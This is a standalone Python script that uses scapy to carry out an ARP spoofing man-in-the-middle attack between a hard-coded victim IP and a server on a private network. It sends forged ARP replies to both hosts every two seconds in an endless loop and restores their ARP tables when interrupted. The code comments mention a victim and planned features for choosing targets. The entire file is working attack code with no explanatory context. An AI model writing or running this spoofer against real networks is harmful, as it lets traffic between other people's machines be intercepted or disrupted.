import scapy.all as scapy
import time

#Define victim IP and Server IP -> automatize, let user select victim also implement sniffing instead of spamming
VICTIM_IP = "192.168.50.20"
SERVER_IP = "192.168.50.30"
INTERFACE = "eth1"

#Get mac adress of the victim

def get_mac(ip):
    arp_request =scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=INTERFACE)[0]


    return answered_list[0][1].hwsrc

def spoof(VICTIM_IP, spoof_ip):
    mac_target = get_mac(VICTIM_IP)
    packet = scapy.ARP(op=2, pdst=VICTIM_IP, hwdst=mac_target, psrc=spoof_ip)
    ether_frame = scapy.Ether(dst=mac_target)
    scapy.sendp(ether_frame / packet, verbose=False, iface=INTERFACE)

def restore(destination_ip, source_ip):
    destination_ip_mac = get_mac(destination_ip)
    source_ip_mac = get_mac(source_ip)
    ether_frame = scapy.Ether(dst=destination_ip_mac)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_ip_mac, psrc=source_ip, hwsrc=source_ip_mac)
    scapy.sendp(ether_frame / packet, count=5, verbose=False, iface=INTERFACE)

def run_spoofing():
    sent_packets_count = 0
    try:
        while True:
            spoof(VICTIM_IP, SERVER_IP)
            spoof(SERVER_IP, VICTIM_IP)
            
            sent_packets_count = sent_packets_count + 2
            print(f"\r[+] Packets Sent: {sent_packets_count}", end="")
            
            time.sleep(2)

    except KeyboardInterrupt:
        # Restore only while testing
        restore(VICTIM_IP, SERVER_IP)
        restore(SERVER_IP, VICTIM_IP)

run_spoofing()